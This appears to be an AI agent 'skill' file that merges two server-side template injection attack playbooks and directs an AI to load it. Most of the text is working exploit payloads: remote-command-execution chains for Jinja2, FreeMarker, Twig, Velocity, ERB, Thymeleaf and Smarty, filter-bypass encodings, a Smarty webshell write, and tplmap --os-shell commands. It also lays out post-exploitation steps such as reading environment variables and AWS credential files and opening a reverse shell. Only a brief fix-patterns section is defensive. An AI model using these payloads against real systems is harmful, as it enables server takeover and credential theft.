---
name: ssti
description: "SSTI playbook. Use when template expressions, server-side rendering, preview features, or templating engines may evaluate attacker-controlled content."
domain: web-injection
merged: true
merged_from: [hack-skills:ssti-server-side-template-injection, hacking-skills:ssti]
---

# ssti

> **Fusionierter Skill** — vereint 2 Quell-Skills zu einem: `hack-skills:ssti-server-side-template-injection`, `hacking-skills:ssti`. Alle Techniken aller Quellen sind unten zusammengeführt, nichts ausgelassen.

## Quelle: hack-skills — ssti-server-side-template-injection (345 Zeilen)

# SKILL: Server-Side Template Injection (SSTI) — Expert Attack Playbook

> **AI LOAD INSTRUCTION**: Expert SSTI techniques. Covers polyglot detection probes, engine fingerprinting, Jinja2/FreeMarker/Twig/ERB RCE chains, client-side Angular SSTI, and bypass techniques. Base models often miss sandbox escape MRO chains and non-Jinja2 engines. For PHP CMS template eval, Jira SSTI, Confluence OGNL, and Spring Cloud Gateway SpEL, load the companion [SCENARIOS.md](./SCENARIOS.md).

## 0. RELATED ROUTING

Before using full engine-specific exploitation, you can first load:

- First use the polyglot probe sequence at the top of this file for low-noise fingerprinting
- [expression-language-injection](../expression-language-injection/SKILL.md) when `${7*7}` or `%{7*7}` resolves in Java (SpEL/OGNL) — different attack surface from template engines

### Extended Scenarios

Also load [SCENARIOS.md](./SCENARIOS.md) when you need:
- Maccms 8.x PHP template `eval` — `{if-A:phpinfo()}{endif-A}` in `vod-search`, base64 bypass for webshell write
- Jira CVE-2019-11581 — "Contact Administrators" form → Velocity template injection → command output in admin email
- Spring Cloud Gateway SpEL (CVE-2022-22947) — actuator route injection with `StreamUtils.copyToByteArray` for output capture
- Struts2 OGNL S2-045 (CVE-2017-5638) — Content-Type header OGNL injection with `_memberAccess` / `OgnlUtil` blacklist clear
- Confluence OGNL CVE-2021-26084 — `createpage-entervariables.action` with `\u0027` unicode bypass
- SSTI vs EL injection disambiguation guide
- Additional template engines: ASP.NET Razor, Elixir EEx, PHP Smarty/Latte/Blade, JS Pug/Handlebars/Nunjucks/EJS/Lodash + universal detection + blind SSTI + Flask PIN calculation

**SCENARIOS.md reference (§7–§11):** For expanded payloads and engine-specific notes on Razor, EEx/LEEx/HEEx, PHP stacks, JavaScript template engines, the universal polyglot probe, mathematical fingerprinting, blind SSTI (boolean / time / OOB), and Flask debug PIN prerequisites, see [SCENARIOS.md](./SCENARIOS.md). This skill keeps a short checklist in §13–§15.

### Engine Payloads Reference

For extended engine-specific fingerprinting, payload matrices (Jinja2, Twig, Freemarker, Velocity, Pebble, Mako, Slim, Handlebars, Thymeleaf, Smarty, ERB, Jade/Pug), and blind SSTI detection techniques (timing-based, DNS-based), see [ENGINE_PAYLOADS.md](./ENGINE_PAYLOADS.md).

### Universal detection & blind SSTI (pointer)

Use the polyglot payload and math probes in §1 and §13 first; when you need fuller blind-test patterns and per-engine examples (including non-Python stacks), follow [SCENARIOS.md](./SCENARIOS.md) §11 and cross-check §14 here for technique names (boolean, time, OOB, error-based).

---

## 1. DETECTION — POLYGLOT PROBE SEQUENCE

First test: distinguish SSTI from XSS. Send these probes and check if **math is evaluated** server-side:

```
{{7*7}}        → IF returns 49 (not {{7*7}}) → Jinja2 or Twig
${7*7}         → IF returns 49 → FreeMarker, Velocity, or Java EL
#{7*7}         → Ruby (ERB interpolation in strings)
<#assign x=7*7>${x}  → FreeMarker
@{7*7}         → Thymeleaf
*{7*7}         → Thymeleaf SpEL (*{...})
```

**Jinja2 vs Twig disambiguation**:
```
{{7*'7'}}
→ 7777777  = Jinja2 (Python string multiplication)
→ 49       = Twig (PHP numeric)
```

**Safe detection probe** (no math, just boolean):
```
{{''.__class__}}   → class 'str' = Python/Jinja2
```

---

## 2. ENGINE-TO-LANGUAGE MAPPING

| Template Engine | Language | Framework |
|---|---|---|
| Jinja2 | Python | Flask, FastAPI |
| Django Templates | Python | Django |
| Mako | Python | Pyramid |
| Twig | PHP | Symfony, Laravel |
| Smarty | PHP | Various |
| FreeMarker | Java | Spring MVC |
| Velocity | Java | Various Java |
| Pebble | Java | Various Java |
| Thymeleaf | Java | Spring Boot |
| ERB | Ruby | Rails |
| Slim / Haml | Ruby | Rails |
| Jade / Pug | Node.js | Express |
| Handlebars | Node.js | Express |
| Tornado | Python | Tornado |

Identifying language from errors → then narrow to template engine.

---

## 3. JINJA2 (PYTHON FLASK) — RCE CHAINS

### Chain 1: `os` module via `__globals__`
```python
{{config.__class__.__init__.__globals__['os'].popen('id').read()}}
```

### Chain 2: MRO subclass traversal (sandbox escape)
```python
# List all subclasses:
{{''.__class__.__mro__[1].__subclasses__()}}

# Find subprocess.Popen index (usually around 258-270, varies by Python version):
# Look for "subprocess.Popen" in the list

# Execute command (replace [258] with correct index):
{{''.__class__.__mro__[1].__subclasses__()[258]('id', shell=True, stdout=-1).communicate()[0]}}
```

### Chain 3: `request` object globals (works when `config` blocked)
```python
{{request|attr('application')|attr('\x5f\x5fglobals\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fbuiltins\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fimport\x5f\x5f')('os')|attr('popen')('id')|attr('read')()}}
```
(Uses hex encoding to avoid `_` filtering)

### Chain 4: `lipsum` function globals (Flask built-in)
```python
{{lipsum.__globals__.os.popen('id').read()}}
```

### Chain 5: `cycler` object
```python
{{cycler.__init__.__globals__.os.popen('id').read()}}
```

### Finding correct subprocess index dynamically:
```python
# In injection:
{% for c in ''.__class__.__mro__[1].__subclasses__() %}
  {% if 'Popen' in c.__name__ %}
    {{loop.index}}
  {% endif %}
{% endfor %}
```

---

## 4. JINJA2 SANDBOX BYPASS TECHNIQUES

### When `_` (underscore) is blocked:
```python
# Use attr filter with hex encoding:
''|attr('\x5f\x5fclass\x5f\x5f')

# Use getattr via request object:
request|attr('args')|attr('__class__')
```

### When `.` (dot) is blocked:
```python
# Use [] subscript notation:
''['__class__']
config['SECRET_KEY']
```

### When keywords (class, mro) are blocked:
Use hex/unicode in `attr()`:
```python
|attr('\x5f\x5fclass\x5f\x5f')
|attr('\x5f\x5fm\x72\x6F\x5f\x5f')
```

### When output encoding strips HTML entities:
Use `|safe` filter to prevent auto-escaping.

---

## 5. FREEMARKER (JAVA) — RCE

### Execute Command via freemarker.template.utility.Execute
```freemarker
<#assign ex="freemarker.template.utility.Execute"?new()>
${ex("id")}
```

### Alternative via ObjectConstructor:
```freemarker  
<#assign ob="freemarker.template.utility.ObjectConstructor"?new()>
<#assign br=ob("java.io.BufferedReader",ob("java.io.InputStreamReader",ob("java.lang.Runtime")?api.exec("id").inputStream))>
${br.readLine()}
```

---

## 6. TWIG (PHP) — RCE

```php
// Twig 1.x (before sandbox):
{{_self.env.registerUndefinedFilterCallback("exec")}}
{{_self.env.getFilter("id")}}

// Twig 2.x using built-ins:
{{['id']|map('system')|join}}

// via filter map:
{{app.request.server.all|join(',')}}
```

---

## 7. VELOCITY (JAVA) — RCE

```velocity
#set($str=$class.inspect("java.lang.Runtime").method.invoke($class.inspect("java.lang.Runtime").type, null))
#set($run=$str.exec("id"))
#set($out=$run.inputStream)
```

Or more directly:
```velocity
#set($class=$currentNode.getClass())
#set($rt=$class.forName("java.lang.Runtime"))
#set($proc=$rt.getMethod("exec",$class.forName("java.lang.String")).invoke($rt.getMethod("getRuntime").invoke(null),"id"))
```

---

## 8. ERB (RUBY RAILS) — RCE

```ruby
<%= system('id') %>
<%= `id` %>
<%= IO.popen('id').read %>
<%= File.read('/etc/passwd') %>
```

---

## 9. THYMELEAF (JAVA SPRING) — RCE

Thymeleaf with Spring EL (SpEL):
```java
// In th:text or th:fragment context:
__${T(java.lang.Runtime).getRuntime().exec("id")}__::type

// Fragment expression context:
__${T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime().exec(new String[]{"/bin/sh","-c","id"}).getInputStream())}__::type
```

---

## 10. CLIENT-SIDE TEMPLATE INJECTION (AngularJS)

When AngularJS is used client-side and user data flows into template expressions:

```javascript
// AngularJS 1.x sandbox escape:
{{constructor.constructor('alert(1)')()}}

// 1.5.x:
{{x = {'y':''.constructor.prototype}; x['y'].charAt=[].join;$eval('x=alert(1)');}}

// 1.3.x:
{{{}[{toString:[].join,length:1,0:'__proto__'}].assign=[].join;'a'.constructor.prototype.charAt=[].join;$eval('x=1} } };alert(1)//');}}
```

**Detection**: send `{{1+1}}` — if page shows `2`, AngularJS evaluates expressions in the DOM.

---

## 11. SSTI → FULL RCE PATH

```
SSTI detected → identify engine
├── Jinja2 → config.__globals__['os'].popen() 
│           OR subclass traversal for Popen
├── FreeMarker → freemarker.template.utility.Execute?new()
├── Twig → _self.env.registerUndefinedFilterCallback('exec')
├── Velocity → java.lang.Runtime.exec()
├── ERB → <%= `cmd` %>
├── Thymeleaf → T(java.lang.Runtime).getRuntime().exec()
└── Angular CSTI → constructor.constructor('payload')()
```

**Post-RCE pivot**:
1. Read `/proc/self/environ` — env vars with credentials
2. Read application config files — DB passwords, API keys
3. `cat ~/.aws/credentials` — cloud credentials
4. Reverse shell for persistence

---

## 12. COMMON INJECTION ENTRY POINTS

Where user data enters templates:
- URL path: `https://site.com/home?name={{7*7}}`
- Query parameters: `?message=Hello`
- HTML forms: profile name, bio, content fields
- Error pages: `404 Not Found: /PAYLOAD`
- Email templates: name in password reset emails
- Inline template rendering: `render_template_string(user_input)`

**Most dangerous**: `render_template_string()` in Flask — entire user input used as template.

---

## 13. UNIVERSAL DETECTION PAYLOADS

**Polyglot probe** that triggers errors or evaluation in many engines:

```
${{<%[%'"}}%\.
```

**Mathematical probes** for blind/error confirmation:

```
{{7*7}}          → 49 (Jinja2, Twig, Nunjucks, Handlebars)
${7*7}           → 49 (FreeMarker, Velocity, EL, Thymeleaf)
<%= 7*7 %>       → 49 (ERB, EJS, EEx)
#{7*7}           → 49 (Pug, Ruby interpolation)
@(7*7)           → 49 (Razor)
{7*7}            → 49 (Smarty)
```

**Error-based engine fingerprint** (parser/stack traces often name the engine):

```
(1/0).zxy.zxy
```

---

## 14. BLIND SSTI TECHNIQUES

- **Boolean-based**: Compare `(3*4/2)` vs `3*)2(/4` — if the first resolves and the second errors, evaluation is likely
- **Time-based**: `{{sleep(5)}}` or the engine-specific equivalent for delay
- **OOB**: DNS/HTTP callback via template expressions when direct output is not visible
- **Error-based**: Force different error messages based on true/false conditions

---

## 15. FLASK PIN CALCULATION

When Flask **debug mode** (Werkzeug debugger) is exposed but **PIN-protected**, the PIN is derived from host-specific values. Typical inputs for public PIN calculation scripts:

1. **`username`** — from `/etc/passwd` (the user running the Flask process)
2. **Module name** — often `flask.app` or `Flask`
3. **Application path** — `app.py` or the real main filename
4. **MAC address** — e.g. `/sys/class/net/eth0/address`, converted to decimal as Werkzeug expects
5. **Machine ID** — `/etc/machine-id`, or `/proc/sys/kernel/random/boot_id` combined with the first line of `/proc/self/cgroup` per Werkzeug’s algorithm
6. **Compute PIN** — use established open-source PIN calculators that implement the same algorithm from these values

> Use only on systems you are authorized to test; obtaining these values implies prior access or an additional info-disclosure vector.

## Quelle: hacking-skills — ssti (128 Zeilen)

# Server-Side Template Injection (SSTI)

## What Is Broken and Why
SSTI occurs when user-supplied data is concatenated into a template string that is then rendered by a server-side template engine. Unlike XSS, execution happens on the server. Template engines provide access to the application runtime environment, enabling attackers to traverse object hierarchies, access internal classes, and ultimately execute arbitrary OS commands. The root cause is using templates as string formatting mechanisms fed with untrusted input rather than rendering only trusted template files.

## Key Signals
- User input is reflected in responses as if processed (math expressions evaluated, not echoed)
- Parameters controlling page layout, email templates, error messages, or notification content
- `{{7*7}}` returns `49` (Jinja2, Twig); `${7*7}` returns `49` (Freemarker, Velocity); `<%= 7*7 %>` returns `49` (ERB)
- Error messages referencing template engines (Jinja2, Twig, Freemarker, Velocity, Smarty, Pebble)
- Python/Java stack traces in response
- Custom error pages that echo request parameters

## Methodology
1. Inject mathematical expressions using different template syntaxes and observe if they are evaluated:
   - `{{7*7}}` → `49` (Jinja2/Twig)
   - `${7*7}` → `49` (Freemarker/Velocity/Mako)
   - `#{7*7}` → `49` (Ruby ERB variant)
   - `<%= 7*7 %>` → `49` (ERB, EJS)
2. Identify the template engine from syntax that evaluates and from error messages.
3. Use engine-specific payloads to access internal objects.
4. Escalate to reading files, then to OS command execution.
5. Automate detection and exploitation with tplmap.

## Payloads & Tools
```
# Detection probes
TARGET/page?name={{7*7}}           # Jinja2, Twig
TARGET/page?name=${7*7}            # Freemarker, Velocity
TARGET/page?name=<%= 7*7 %>        # ERB
TARGET/page?name=#{7*7}            # Ruby
TARGET/page?name={{7*'7'}}         # Twig (returns 7777777, Jinja2 returns 49)

# Jinja2 (Python) — RCE via __mro__ traversal
{{''.__class__.__mro__[1].__subclasses__()}}
{{''.__class__.__mro__[1].__subclasses__()[396]('id',shell=True,stdout=-1).communicate()}}

# Jinja2 — config object read
{{config}}
{{config.items()}}

# Jinja2 — file read
{{''.__class__.__mro__[1].__subclasses__()[40]('/etc/passwd').read()}}

# Jinja2 — RCE alternative
{{ self._TemplateReference__context.cycler.__init__.__globals__.os.popen('id').read() }}

# Twig (PHP) — RCE
{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("id")}}

# Freemarker (Java) — RCE
<#assign ex="freemarker.template.utility.Execute"?new()>${ex("id")}
${"freemarker.template.utility.Execute"?new()("id")}

# Velocity (Java)
#set($x='')##
#set($rt=$x.class.forName('java.lang.Runtime'))
#set($chr=$x.class.forName('java.lang.Character'))
#set($str=$x.class.forName('java.lang.String'))
#set($ex=$rt.getRuntime().exec('id'))

# Smarty (PHP)
{php}echo `id`;{/php}
{Smarty_Internal_Write_File::writeFile($SCRIPT_NAME,"<?php passthru($_GET['cmd']); ?>",self::clearConfig())}

# tplmap automated detection and exploitation
tplmap -u "TARGET/page?name=*"
tplmap -u "TARGET/page?name=*" --os-shell
tplmap -u "TARGET/page" --data "name=*" --os-cmd "id"
```

## Bypass Techniques
- If `{{` is filtered, try alternate delimiters: `${`, `#{`, `<%= `, `{%`
- String concatenation to bypass keyword filters: `{{'os'|attr('popen')('id')|attr('read')()}}`
- Hex encoding of payload strings
- Use `|attr()` filter in Jinja2 to access attributes without dot notation
- Request parameter names rather than values may also be template-injected
- JSON body parameters may be reflected into templates — test all body fields
- Stored SSTI via profile fields, custom email templates, notification settings

## Exploitation Scenarios
**Scenario 1 — Jinja2 RCE via Name Parameter**
Setup: Flask application renders `Hello, {{ name }}!` where `name` is a URL parameter.
Trigger: `TARGET/greet?name={{config.__class__.__init__.__globals__['os'].popen('id').read()}}`
Impact: OS command output returned in response; pivot to reverse shell.

**Scenario 2 — Freemarker SSTI in Java CMS**
Setup: CMS allows administrators to customize notification email templates with user-supplied variables.
Trigger: Insert `${"freemarker.template.utility.Execute"?new()("cat /etc/passwd")}` into template subject.
Impact: File contents returned when template is rendered/previewed; full server file read.

**Scenario 3 — Twig SSTI in PHP Application**
Setup: Error page template incorporates URL parameter for display.
Trigger: `TARGET/error?msg={{_self.env.registerUndefinedFilterCallback("system")}}{{_self.env.getFilter("id")}}`
Impact: RCE as web server user; escalate to webshell upload.

## False Positives
- Template syntax echoed literally without evaluation (template auto-escaping enabled)
- Mathematical result coincidence (e.g., `7*7` appearing in content for unrelated reasons)
- Client-side template engines (Angular `{{}}`, Vue `{{}}`) — execution in browser, not server
- WAF returning `49` in an error message that happens to contain that string

## Fix Patterns
- Never concatenate user input directly into template strings; pass user data as template variables/context
- Use sandboxed template environments where available (Jinja2 SandboxedEnvironment)
- Allowlist permitted template syntax if user-customizable templates are required
- Validate and sanitize template input against a strict pattern
- Run template rendering in a restricted subprocess with limited OS permissions
- Use logic-less templating engines (Mustache, Handlebars with `allowProtoProperties: false`) for user-facing customization

## Related Skills

[[cmd-injection]] and SSTI both achieve arbitrary OS command execution via injection into an interpreter — SSTI routes through a template sandbox escape while cmd-injection hits the shell directly. The detection methodology (inject an expression, observe evaluation) mirrors [[xss-reflected]] canary probing but the consequence is server-side rather than client-side. SSTI is often found in the same parameters that also carry [[xss-reflected]] payloads — a parameter that reflects `{{7*7}}` as `49` has SSTI; one that reflects `<script>` unencoded has XSS.
